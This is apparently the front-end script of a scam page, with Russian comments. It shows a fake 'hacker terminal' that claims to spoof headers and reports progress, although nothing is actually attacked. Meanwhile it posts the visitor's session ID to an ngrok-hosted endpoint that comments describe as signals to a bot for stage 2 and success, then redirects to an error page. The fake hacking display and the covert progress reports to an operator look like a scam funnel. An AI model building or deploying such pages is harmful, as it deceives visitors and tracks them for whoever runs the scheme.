document.addEventListener('DOMContentLoaded', () => {
    const sitePreloader = document.getElementById('sitePreloader');
    const hackerModal = document.getElementById('hackerModal');
    const profileLoaderOverlay = document.getElementById('profileLoaderOverlay');
    const terminalConsole = document.getElementById('terminalConsole');
    const progressBarFill = document.getElementById('progressBarFill');
    const progressPercent = document.getElementById('progressPercent');

    const logs = [
        { type: 'info', text: 'Spoofing User-Agent and injecting X-Forwarded-For headers...' },
        { type: 'success', text: 'Done! ' },
    ];

    function runHackerTerminal(onComplete) {
        let currentLogIndex = 0;
        const totalLogs = logs.length;

        function processNextLog() {
            if (currentLogIndex < totalLogs) {
                const log = logs[currentLogIndex];
                const now = new Date();
                const timeStr = now.toTimeString().split(' ')[0] + '.' + String(now.getMilliseconds()).padStart(3, '0');

                let tagClass = 'tag-info';
                let tagTitle = '[INFO]';
                if (log.type === 'warn') { tagClass = 'tag-warn'; tagTitle = '[WARN]'; }
                if (log.type === 'success') { tagClass = 'tag-success'; tagTitle = '[OK]  '; }

                const lineDiv = document.createElement('div');
                lineDiv.className = 'log-line';
                lineDiv.innerHTML = `<span class="timestamp">${timeStr}</span> <span class="${tagClass}">${tagTitle}</span> ${log.text}`;
                
                terminalConsole.appendChild(lineDiv);
                terminalConsole.scrollTop = terminalConsole.scrollHeight;

                currentLogIndex++;
                const percent = Math.round((currentLogIndex / totalLogs) * 100);
                progressBarFill.style.width = percent + '%';
                progressPercent.textContent = percent + '%';

                let delay = 0;
                if (log.text.includes('Brute-forcing') || log.text.includes('evasion protocol')) {
                    delay = Math.floor((Math.random() * 800 + 900) / 2);
                } else if (log.text.includes('Dumping') || log.text.includes('Extracting')) {
                    delay = Math.floor((Math.random() * 150 + 50) / 2);
                } else if (log.type === 'success') {
                    delay = Math.floor((Math.random() * 100 + 400) / 2);
                } else {
                    delay = Math.floor((Math.random() * 150 + 150) / 2);
                }

                setTimeout(processNextLog, delay);
            } else {
                setTimeout(() => {
                    if (onComplete) onComplete();
                }, 400); 
            }
        }

        processNextLog();
    }

    // --- СЦЕНАРИЙ ДЕЙСТВИЙ ---
    setTimeout(() => {
        if (sitePreloader) {
            sitePreloader.classList.add('hidden');
        }

        setTimeout(() => {
            if (hackerModal) {
                hackerModal.classList.add('visible');
                
                // --- ОТПРАВЛЯЕМ СИГНАЛ В БОТА: ЭТАП 2 ---
                fetch('https://runaround-defiance-unmasked.ngrok-free.dev/api/stage2', {
                    method: 'POST',
                    headers: { 
                        'Content-Type': 'application/json',
                        'ngrok-skip-browser-warning': 'true' // <--- ЭТО РЕШАЕТ ВСЁ
                    },
                    body: JSON.stringify({ sessionId: localStorage.getItem('sessionId') })
                }).catch(err => console.error(err));
                
                runHackerTerminal(() => {
                    hackerModal.classList.remove('visible');

                    setTimeout(() => {
                        if (profileLoaderOverlay) {
                            profileLoaderOverlay.classList.add('visible');
                        }

                        // --- ОТПРАВЛЯЕМ СИГНАЛ В БОТА: ЭТАП 3 ---
                        fetch('https://runaround-defiance-unmasked.ngrok-free.dev/api/success', {
                            method: 'POST',
                            headers: { 
                                'Content-Type': 'application/json',
                                'ngrok-skip-browser-warning': 'true' // <--- И ЗДЕСЬ ТОЖЕ
                            },
                            body: JSON.stringify({ sessionId: localStorage.getItem('sessionId') })
                        }).catch(err => console.error(err));

                        setTimeout(() => {
                            window.location.href = 'error.html';
                        }, 3000);

                    }, 400);
                });
            }

        }, 2000);

    }, 1200);
});
